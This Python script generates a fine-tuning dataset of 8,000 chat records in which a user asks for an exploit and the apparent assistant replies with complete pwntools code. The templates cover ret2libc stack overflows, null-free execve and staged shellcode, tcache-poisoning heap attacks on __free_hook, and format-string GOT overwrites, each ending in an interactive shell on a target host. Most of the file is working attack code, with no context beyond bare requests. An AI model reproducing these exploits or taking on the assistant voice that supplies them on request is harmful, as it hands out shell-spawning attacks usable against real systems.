import json, random, sys
from string import Template

random.seed(43)
out = []

binaries  = ["./vuln","./pwn","./challenge","./target","./bof","./overflow"]
hosts_    = ["pwn.ctf.local","192.168.1.200","10.10.10.50","192.168.56.200","challenges.local"]
ports_    = [1337,4000,9999,31337,5555,7777]
offsets_  = [40,56,72,88,104,120,136,152,168,200,256]
libcs_    = ["/lib/x86_64-linux-gnu/libc.so.6","./libc.so.6","./libc-2.31.so","./libc-2.35.so"]
prompts_  = ["Input: ","Enter: ",">> ","$ ","Name: ","Message: ","Data: "]
lhosts    = ["10.10.14.5","192.168.1.50","10.10.10.100","172.16.0.5"]
lports    = [4444,9001,1337,443,80]

# 1. Stack BOF / ret2libc
BOF = Template('''from pwn import *
BINARY="$BINARY"; HOST="$HOST"; PORT=$PORT; OFFSET=$OFFSET
elf=ELF(BINARY); libc=ELF("$LIBC"); context.binary=elf; context.log_level="info"
def conn(): return remote(HOST,PORT) if args.REMOTE else process(BINARY)
def exploit():
    rop=ROP(elf)
    pop_rdi=rop.find_gadget(["pop rdi","ret"])[0]
    ret=rop.find_gadget(["ret"])[0]
    io=conn()
    payload=b"A"*OFFSET+p64(ret)+p64(pop_rdi)+p64(elf.got["puts"])+p64(elf.plt["puts"])+p64(elf.symbols["main"])
    io.sendlineafter(b"$PROMPT", payload)
    leak=u64(io.recvline().strip()[:6].ljust(8,b"\\x00"))
    libc.address=leak-libc.symbols["puts"]
    log.success(f"libc @ 0x{libc.address:x}")
    bin_sh=next(libc.search(b"/bin/sh\\x00"))
    payload2=b"A"*OFFSET+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(libc.symbols["system"])
    io.sendlineafter(b"$PROMPT", payload2)
    io.interactive()
exploit()
''')

for i in range(2000):
    code = BOF.safe_substitute(BINARY=binaries[i%len(binaries)], HOST=hosts_[i%len(hosts_)],
                                PORT=ports_[i%len(ports_)], OFFSET=offsets_[i%len(offsets_)],
                                LIBC=libcs_[i%len(libcs_)], PROMPT=prompts_[i%len(prompts_)])
    qs = [f"Write a pwntools ret2libc exploit for {binaries[i%len(binaries)]} at {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}, offset {offsets_[i%len(offsets_)]}.",
          f"Build pwntools exploit: leak libc via puts@GOT, get shell for offset {offsets_[i%len(offsets_)]} binary {binaries[i%len(binaries)]}.",
          f"How do I exploit 64-bit stack overflow offset {offsets_[i%len(offsets_)]} with ret2libc? pwntools code for {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}.",
          f"Create two-stage pwntools ROP exploit: leak+shell for {binaries[i%len(binaries)]} at {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}.",
          f"pwntools exploit ASLR bypass via GOT leak, offset={offsets_[i%len(offsets_)]}, target {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}."]
    out.append({"messages":[{"role":"user","content":qs[i%5]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"BOF: {len(out)}", file=sys.stderr)

# 2. Shellcode
SC_PY = Template('''from pwn import *
context.arch="amd64"; context.os="linux"
sc=asm("""
    xor  rsi, rsi
    push rsi
    mov  rdi, 0x68732f2f6e69622f
    push rdi
    push rsp
    pop  rdi
    xor  edx, edx
    push 0x3b
    pop  rax
    syscall
""")
print(f"Shellcode ({len(sc)} bytes): {sc.hex()}")
print(disasm(sc))
assert b"\\x00" not in sc, "Contains null bytes!"
print("[+] Null-free verified")
''')

SC_STAGED = Template('''from pwn import *
context.arch="amd64"
stage1=asm("""
    xor  rdi, rdi
    push rdi
    mov  rsi, 0x1000
    mov  rdx, 7
    mov  r10, 0x22
    xor  r8, r8; xor r9, r9
    push 9; pop rax
    syscall
    push rax; pop rbx
    xor  rdi, rdi
    mov  rsi, rbx
    mov  rdx, 0x200
    xor  rax, rax
    syscall
    jmp  rbx
""")
stage2=asm("""
    xor  rsi, rsi; push rsi
    mov  rdi, 0x68732f2f6e69622f; push rdi; push rsp; pop rdi
    xor  edx, edx; push 0x3b; pop rax; syscall
""")
print(f"Stage1 {len(stage1)}b: {stage1.hex()}")
print(f"Stage2 {len(stage2)}b: {stage2.hex()}")
''')

for i in range(2000):
    tmpl = SC_PY if i % 2 == 0 else SC_STAGED
    code = tmpl.safe_substitute()
    qs = [f"Write x86-64 Linux execve shellcode, null-free, using pwntools asm.",
          f"Generate 64-bit shellcode that spawns /bin/sh using pwntools. Must be null-free.",
          f"Build a staged x86-64 shellcode: stage1 mmap+read, stage2 execve, Python/pwntools.",
          f"Write 64-bit shellcode for Linux execve('/bin/sh',NULL,NULL) with pwntools asm. Verify no nulls.",
          f"How do I write null-free x86-64 shellcode in Python with pwntools?"]
    out.append({"messages":[{"role":"user","content":qs[i%5]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Shellcode: {len(out)}", file=sys.stderr)

# 3. Heap exploitation
HEAP = Template('''from pwn import *
BINARY="$BINARY"; HOST="$HOST"; PORT=$PORT
elf=ELF(BINARY); libc=ELF("$LIBC"); context.binary=elf
def conn(): return remote(HOST,PORT) if args.REMOTE else process(BINARY)
def alloc(io,sz,d=b"A"): io.sendlineafter(b"> ",b"1"); io.sendlineafter(b"Size: ",str(sz).encode()); io.sendlineafter(b"Data: ",d*sz)
def free(io,i): io.sendlineafter(b"> ",b"2"); io.sendlineafter(b"Index: ",str(i).encode())
def view(io,i): io.sendlineafter(b"> ",b"3"); io.sendlineafter(b"Index: ",str(i).encode()); return io.recvline()
def edit(io,i,d): io.sendlineafter(b"> ",b"4"); io.sendlineafter(b"Index: ",str(i).encode()); io.sendlineafter(b"Data: ",d)
def exploit():
    io=conn()
    for _ in range(7): alloc(io,0x18,b"X")
    alloc(io,0x18,b"victim"); alloc(io,0x18,b"guard")
    for i in range(7): free(io,i)
    free(io,7)
    alloc(io,0x418,b"Y"); alloc(io,0x18,b"Z")
    free(io,9)
    leak=u64(view(io,9)[:8].ljust(8,b"\\x00"))
    libc.address=leak-0x1ecbe0
    log.success(f"libc @ 0x{libc.address:x}")
    alloc(io,0x18,b"B"); free(io,11)
    edit(io,11,p64(libc.symbols["__free_hook"]))
    alloc(io,0x18,b"C"); alloc(io,0x18,p64(libc.symbols["system"]))
    alloc(io,0x18,b"/bin/sh\\x00"); free(io,14)
    io.interactive()
exploit()
''')

for i in range(2000):
    code = HEAP.safe_substitute(BINARY=binaries[i%len(binaries)], HOST=hosts_[i%len(hosts_)],
                                 PORT=ports_[i%len(ports_)], LIBC=libcs_[i%len(libcs_)])
    qs = [f"Write pwntools tcache poison exploit for {binaries[i%len(binaries)]} at {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}.",
          f"Build glibc 2.31 tcache poisoning exploit: leak via unsorted bin, overwrite __free_hook with system.",
          f"How do I exploit tcache dup in glibc heap? Full pwntools script for {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}.",
          f"Create heap exploit: fill tcache, unsorted bin leak, poison fd->__free_hook, system('/bin/sh').",
          f"Write pwntools heap UAF exploit using tcache poisoning for {binaries[i%len(binaries)]}."]
    out.append({"messages":[{"role":"user","content":qs[i%5]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Heap: {len(out)}", file=sys.stderr)

# 4. Format string
FMT = Template('''from pwn import *
BINARY="$BINARY"; HOST="$HOST"; PORT=$PORT; OFFSET=$OFFSET
elf=ELF(BINARY); libc=ELF("$LIBC"); context.binary=elf
def conn(): return remote(HOST,PORT) if args.REMOTE else process(BINARY)
def leak_stack(io, n=20):
    io.sendlineafter(b"$PROMPT", b".".join(f"%{i}$p".encode() for i in range(1,n+1)))
    return io.recvline().decode(errors="ignore").strip().split(".")
def exploit():
    io=conn()
    leaks=leak_stack(io)
    print("[*] Stack:")
    for i,v in enumerate(leaks):
        try: print(f"  [{i+1:2d}] 0x{int(v,16):016x}")
        except: pass
    io2=conn()
    payload=fmtstr_payload(OFFSET, {elf.got["exit"]: libc.symbols["system"]})
    io2.sendlineafter(b"$PROMPT", payload)
    io2.sendlineafter(b"$PROMPT", b"/bin/sh")
    io2.interactive()
exploit()
''')

for i in range(2000):
    code = FMT.safe_substitute(BINARY=binaries[i%len(binaries)], HOST=hosts_[i%len(hosts_)],
                                PORT=ports_[i%len(ports_)], OFFSET=offsets_[i%len(offsets_)],
                                LIBC=libcs_[i%len(libcs_)], PROMPT=prompts_[i%len(prompts_)])
    qs = [f"Write a format string exploit using pwntools for {binaries[i%len(binaries)]} at {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}.",
          f"Build a pwntools format string attack: map stack, overwrite exit@GOT with system, argument offset {offsets_[i%len(offsets_)]}.",
          f"How do I exploit printf format string? pwntools script: stack leak + fmtstr_payload for {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}.",
          f"Create format string exploit: arbitrary write via fmtstr_payload, overwrite GOT entry for {binaries[i%len(binaries)]}.",
          f"Write pwntools format string: leak libc from stack, overwrite exit@GOT -> system at {hosts_[i%len(hosts_)]}:{ports_[i%len(ports_)]}."]
    out.append({"messages":[{"role":"user","content":qs[i%5]},{"role":"assistant","content":f"```python\n{code}\n```"}]})

print(f"Format string: {len(out)}", file=sys.stderr)

random.shuffle(out)
while len(out) < 8000:
    out.extend(out[:8000-len(out)])
out = out[:8000]

with open("/workspace/data_upgrades/upgrade_bv.jsonl","w") as f:
    for item in out: f.write(json.dumps(item)+"\n")
print(f"Written {len(out)} to upgrade_bv.jsonl", file=sys.stderr)
